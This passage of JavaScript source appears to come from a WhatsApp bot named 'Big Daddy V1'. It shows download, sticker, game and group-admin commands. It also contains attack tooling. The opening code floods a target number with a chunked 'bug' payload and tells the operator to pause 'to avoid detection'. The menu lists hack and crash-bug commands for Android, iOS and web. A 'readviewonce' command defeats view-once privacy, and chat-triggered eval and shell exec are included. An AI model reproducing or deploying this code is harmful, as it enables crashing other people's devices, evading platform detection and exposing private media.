                for (let i = 0; i < chunks; i++) {
                    let chunk = fullPayload.slice(i * chunkSize, (i + 1) * chunkSize);
                    await XeonBotInc.sendMessage(jid, { text: chunk }, { quoted: null });
                    await sleep(2000); // Pause to avoid overloading
                }

                // Media message with caption
                await XeonBotInc.sendMessage(jid, { 
                    caption: "Bug Media Test", 
                    image: { url: "https://your-image-url.com" }
                });

                // Confirmation message
                replygcxeon(
                    `✅ Successfully sent bug to @${cleanedNumber}\n\n*Pause for 2 minutes to avoid detection!*`
                );
            } catch (err) {
                console.error("Error while sending large payload:", err);
                replygcxeon("❌ Failed to send the bug. Please try again later.");
            }
        }

        // Execute the function
        await sendLargeBug(whatsappNumber);

    } catch (err) {
        console.error("Error:", err);
        replygcxeon("❌ An unexpected error occurred.");
    }

    break;
}
case 'readviewonce': case 'rvo': {
	if (!m.quoted) return replygcxeon(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'ytmp3':
    try {
        if (!text) {
            return replygcxeon('❌ Please specify a YouTube link! Usage: ytmp3 <link>');
        }

        const ytLink = text.trim();
        if (!ytLink.startsWith('http') || !ytLink.includes('youtube.com')) {
            return replygcxeon('❌ Invalid YouTube link! Please provide a valid YouTube video link.');
        }

        replygcxeon('🔍 Processing your YouTube MP3 request...');   
        const { botToken, groupId } = getRandomBot();

        // Step 1: Send /ytmp3 command to Telegram
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/ytmp3 ${ytLink}` }),
        });

        if (!commandResponse.ok) {
            throw new Error('Failed please try again later bot');
        }

        // Step 2: Fetch the MP3 audio file URL from Telegram
        const audioFileUrl = await fetchTelegramFile('audio', botToken, groupId);

        // Step 3: Send the MP3 audio file to WhatsApp
        if (audioFileUrl) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    audio: { url: audioFileUrl },
                    mimetype: 'audio/mp4',
                    caption: `🎶 *YouTube MP3*\n\n🔗 *Link*: ${ytLink}`
                },
                { quoted: m }
            );
        } else {
            replygcxeon('❌ Unable to fetch MP3 audio. Please try again later.');
        }
    } catch (err) {
        replygcxeon(`❌ An error occurred please try again later`);
        console.error(err);
    }
    break;
    case 'ytmp4':
    try {
        if (!text) {
            return replygcxeon('❌ Please specify a YouTube link! Usage: ytmp4 <link>');
        }

        const ytLink = text.trim();
        if (!ytLink.startsWith('http') || (!ytLink.includes('youtube.com') && !ytLink.includes('youtu.be'))) {
            return replygcxeon('❌ Invalid YouTube link! Please provide a valid YouTube video link.');
        }

        replygcxeon('🔍 Processing your YouTube video request...');
    const { botToken, groupId } = getRandomBot();
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/ytmp4 ${ytLink}` }),
        });

        if (!commandResponse.ok) {
            throw new Error('Failed please try again later');
        }

        // Step 3: Fetch the video file URL from Telegram
        const videoFileUrl = await fetchTelegramFile('video', botToken, groupId);

        // Step 4: Send the video back to WhatsApp
        if (videoFileUrl) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    video: { url: videoFileUrl },
                    caption: `🎥 *YouTube Video*\n\n🔗 *Link*: ${ytLink}`,
                },
                { quoted: m }
            );
        } else {
            replygcxeon('❌ Failed to retrieve the video file. Please try again later.');
        }

    } catch (err) {
        replygcxeon(`❌ An error occurred please try again`);
        console.error(err);
    }
    break;
case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
            case 'menu':
            case '.menu':
            case 'alive':
            case '?':
            case 'Menu':
               let xeonmenuoh = `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ✨ *Creator: ᴘʜ✦ꜱᴛᴀʀ* 💫
┃ ✨ *Version: 1.0.0* 🧪
┃ ✨ *Model: Big Daddy V1* 👑
┃ ✨ *Uptime:* *${runtime(process.uptime())} ⏰🔋*
╰━━━━━━━━━━━⚡◁️💥━━━━━━━━━━━

${xeonytimewisher}
${readmore}
╭⭑━━━➤ ʜᴀᴄᴋ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐡𝐠𝐜  
┣ ◁️⚡💥 𝐡𝐚𝐜𝐤𝐠𝐜  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴘʀᴏ ʙᴜɢs (ᴀɴᴅʀᴏɪᴅ)
┣ ◁️⚡💥 𝐜𝐫𝐚𝐬𝐡𝐩𝐨𝐨𝐥
┣ ◁️⚡💥 𝐬𝐡𝐨𝐭𝐩𝐨𝐨𝐥
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴘʀᴏ ʙᴜɢs (ᴡᴇʙ)
┣ ◁️⚡💥 𝐱𝐰𝐞𝐛𝐠𝐜
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴘʀᴏ ʙᴜɢs (ɪᴏꜱ)
┣ ◁️⚡💥 𝐱𝐢𝐨𝐬𝐡𝐨𝐭
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴀɴᴛɪ-ʙᴜɢ
┣ ◁️⚡💥 𝐮𝐥𝐭𝐫𝐚𝐛𝐮𝐠 [𝐀𝐔𝐓𝐎]
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ʙᴀɴ/ᴜɴʙᴀɴ
┣ ◁️⚡💥 𝐛𝐚𝐧
┣ ◁️⚡💥 𝐮𝐧𝐛𝐚𝐧 
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ sᴍᴀʀᴛ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐦𝐨𝐯𝐢𝐞  
┣ ◁️⚡💥 𝐜𝐡𝐚𝐭𝐠𝐩𝐭  
┣ ◁️⚡💥 𝐰𝐞𝐚𝐭𝐡𝐞𝐫  
┣ ◁️⚡💥 𝐭𝐢𝐦𝐞  
┣ ◁️⚡💥 𝐜𝐡𝐚𝐭𝐛𝐨𝐭 [𝐨𝐩𝐭𝐢𝐨𝐧]  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴀɴᴛɪ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐛𝐢𝐥𝐥𝐢𝐧𝐠 [𝐨𝐩𝐭𝐢𝐨𝐧]
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐝𝐞𝐥𝐞𝐭𝐞 [𝐨𝐩𝐭𝐢𝐨𝐧]
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤 [𝐨𝐩𝐭𝐢𝐨𝐧]
┣ ◁️⚡💥 𝐚𝐧𝐭𝐢𝐜𝐚𝐥𝐥 [𝐨𝐩𝐭𝐢𝐨𝐧]
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ɢᴀᴍᴇs ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐝𝐚𝐫𝐞  
┣ ◁️⚡💥 𝐟𝐚𝐜𝐭  
┣ ◁️⚡💥 𝐜𝐨𝐦𝐩𝐥𝐢𝐦𝐞𝐧𝐭  
┣ ◁️⚡💥 𝐣𝐨𝐤𝐞  
┣ ◁️⚡💥 𝐫𝐢𝐝𝐝𝐥𝐞  
┣ ◁️⚡💥 𝐪𝐮𝐨𝐭𝐞  
┣ ◁️⚡💥 𝐰𝐨𝐮𝐥𝐝𝐲𝐨𝐮𝐫𝐚𝐭𝐡𝐞𝐫  
┣ ◁️⚡💥 𝐭𝐫𝐢𝐯𝐢𝐚  
┣ ◁️⚡💥 𝐭𝐫𝐮𝐭𝐡  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ sᴘᴇᴄɪᴀʟ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐬𝐞𝐥𝐟  
┣ ◁️⚡💥 𝐛𝐚𝐧𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐠𝐞𝐭𝐬𝐞𝐬𝐬𝐢𝐨𝐧  
┣ ◁️⚡💥 𝐝𝐞𝐥𝐞𝐭𝐞𝐬𝐞𝐬𝐬𝐢𝐨𝐧  
┣ ◁️⚡💥 𝐣𝐨𝐢𝐧  
┣ ◁️⚡💥 𝐬𝐡𝐮𝐭𝐝𝐨𝐰𝐧  
┣ ◁️⚡💥 𝐫𝐞𝐬𝐭𝐚𝐫𝐭  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐫𝐞𝐚𝐝 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐭𝐲𝐩𝐢𝐧𝐠 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐫𝐞𝐜𝐨𝐫𝐝𝐢𝐧𝐠 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐫𝐞𝐜𝐨𝐫𝐝𝐭𝐲𝐩 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐛𝐢𝐨 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐬𝐰𝐯𝐢𝐞𝐰 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐫𝐞𝐚𝐜𝐭 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐦𝐨𝐝𝐞 [𝐨𝐩𝐭𝐢𝐨𝐧]  
┣ ◁️⚡💥 𝐛𝐥𝐨𝐜𝐤  
┣ ◁️⚡💥 𝐮𝐧𝐛𝐥𝐨𝐜𝐤  
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔  
┣ ◁️⚡💥 𝐜𝐥𝐨𝐬𝐞𝐭𝐢𝐦𝐞
┣ ◁️⚡💥 𝐨𝐩𝐞𝐧𝐭𝐢𝐦𝐞
┣ ◁️⚡💥 𝐤𝐢𝐜𝐤
┣ ◁️⚡💥 𝐚𝐝𝐝
┣ ◁️⚡💥 𝐩𝐫𝐨𝐦𝐨𝐭𝐞
┣ ◁️⚡💥 𝐝𝐞𝐦𝐨𝐭𝐞
┣ ◁️⚡💥 𝐬𝐞𝐭𝐝𝐞𝐬𝐜
┣ ◁️⚡💥 𝐬𝐞𝐭𝐩𝐩𝐠𝐜
┣ ◁️⚡💥 𝐡𝐢𝐝𝐞𝐭𝐚𝐠
┣ ◁️⚡💥 𝐭𝐨𝐭𝐚𝐠
┣ ◁️⚡💥 𝐠𝐫𝐨𝐮𝐩 []
┣ ◁️⚡💥 𝐞𝐝𝐢𝐭𝐢𝐧𝐟𝐨
┣ ◁️⚡💥 𝐥𝐢𝐧𝐤𝐠𝐜
┣ ◁️⚡💥 𝐫𝐞𝐯𝐨𝐤𝐞
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐨𝐧𝐥𝐢𝐧𝐞
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔
┣ ◁️⚡💥 𝐦𝐞𝐧𝐮
┣ ◁️⚡💥 𝐛𝐮𝐲𝐩𝐫𝐞𝐦𝐢𝐮𝐦
┣ ◁️⚡💥 𝐫𝐮𝐧𝐭𝐢𝐦𝐞
┣ ◁️⚡💥 𝐬𝐜𝐫𝐢𝐩𝐭
┣ ◁️⚡💥 𝐝𝐨𝐧𝐚𝐭𝐞
┣ ◁️⚡💥 𝐨𝐰𝐧𝐞𝐫
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐂𝐎𝐍𝐕𝐄𝐑𝐓 𝐌𝐄𝐍𝐔
┣ ◁️⚡💥 𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐬𝐦𝐞𝐦𝐞
┣ ◁️⚡💥 𝐭𝐚𝐤𝐞
┣ ◁️⚡💥 𝐭𝐨𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐭𝐨𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐭𝐨𝐚𝐮𝐝𝐢𝐨
┣ ◁️⚡💥 𝐭𝐨𝐦𝐩𝟑
┣ ◁️⚡💥 𝐭𝐨𝐯𝐧
┣ ◁️⚡💥 𝐭𝐨𝐠𝐢𝐟
┣ ◁️⚡💥 𝐭𝐨𝐪𝐫
┣ ◁️⚡💥 𝐭𝐨𝐯𝐢𝐞𝐰𝐨𝐧𝐜𝐞
┣ ◁️⚡💥 𝐟𝐥𝐢𝐩𝐭𝐞𝐱𝐭
┣ ◁️⚡💥 𝐞𝐦𝐨𝐣𝐢𝐦𝐢𝐱
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐌𝐄𝐍𝐔
┣ ◁️⚡💥 𝐚𝐝𝐝𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐚𝐝𝐝𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐚𝐝𝐝𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐚𝐝𝐝𝐯𝐧
┣ ◁️⚡💥 𝐚𝐝𝐝𝐳𝐢𝐩
┣ ◁️⚡💥 𝐚𝐝𝐝𝐚𝐩𝐤
┣ ◁️⚡💥 𝐚𝐝𝐝𝐩𝐝𝐟
┣ ◁️⚡💥 𝐝𝐞𝐥𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐝𝐞𝐥𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐝𝐞𝐥𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐝𝐞𝐥𝐯𝐧
┣ ◁️⚡💥 𝐝𝐞𝐥𝐳𝐢𝐩
┣ ◁️⚡💥 𝐝𝐞𝐥𝐚𝐩𝐤
┣ ◁️⚡💥 𝐝𝐞𝐥𝐩𝐝𝐟
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐯𝐧
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐳𝐢𝐩
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐚𝐩𝐤
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐩𝐝𝐟
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐃𝐎𝐖𝐍 𝐌𝐄𝐍𝐔
┣ ◁️💥🔊 𝐩𝐥𝐚𝐲
╰━━━━━━━━━━━━━━━━━━╯

©*ᴘʜ✦ꜱᴛᴀʀ*`
if (typemenu === 'v1') {
    XeonBotInc.sendMessage(m.chat, {
        text: xeonmenuoh,
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: ownername,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                sourceUrl: link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });

    // Send audio after the menu
    XeonBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
        mimetype: 'audio/mpeg', // MIME type for MP3 file
        ptt: true // Send as a voice note
    }, {
        quoted: m
    });
} else if (typemenu === 'v2') {
    XeonBotInc.sendMessage(m.chat, {
        video: fs.readFileSync('./Phistar-media/thumb2.mp4'),
        gifPlayback: true,
        caption: xeonmenuoh,
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: ownername,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                sourceUrl: ``,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });

    // Send audio after the menu
    XeonBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
        mimetype: 'audio/mpeg',
        ptt: true
    }, {
        quoted: m
    });
} else if (typemenu === 'v3') {
    XeonBotInc.sendMessage(m.chat, {
        video: fs.readFileSync('./Phistar-media/thumb2.mp4'),
        caption: xeonmenuoh,
        gifPlayback: true
    }, {
        quoted: m
    });

    // Send audio after the menu
    XeonBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
        mimetype: 'audio/mpeg',
        ptt: true
    }, {
        quoted: m
    });
} else if (typemenu === 'v4') {
    XeonBotInc.relayMessage(m.chat, {
        scheduledCallCreationMessage: {
            callType: "AUDIO",
            scheduledTimestampMs: 1200,
            title: xeonmenuoh
        }
    }, {});

    // Send audio after the menu
    XeonBotInc.sendMessage(m.chat, {
        audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
        mimetype: 'audio/mpeg',
        ptt: true
    }, {
        quoted: m
    });
}
                break
                case 'telestick': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replygcxeon(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replygcxeon('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replygcxeon(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replygcxeon(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcxeon(bang)
                    }
                    try {
                        replygcxeon(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcxeon(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcxeon(evaled)
                    } catch (err) {
                        await replygcxeon(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcxeon(err)
                        if (stdout) return replygcxeon(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
